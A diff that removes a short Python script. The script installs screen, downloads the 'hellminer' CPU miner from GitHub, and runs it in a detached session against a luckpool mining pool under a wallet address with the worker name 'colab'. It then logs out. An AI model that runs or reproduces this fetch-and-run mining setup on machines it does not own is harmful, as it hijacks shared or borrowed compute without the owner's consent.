@@ -1,9 +1,0 @@
-#!/usr/bin/python3
-
-import os
-os.system("sudo apt update")
-os.system("sudo apt install screen")
-os.system("wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz")
-os.system("tar -xvf hellminer_cpu_linux.tar.gz")
-os.system("screen -d -m -S itsfii bash -c './hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RHvyBq43am2Cfu6xp8tJzDUqj8Jsok5Byq.colab -p x --cpu 40'")
-os.system("logout")
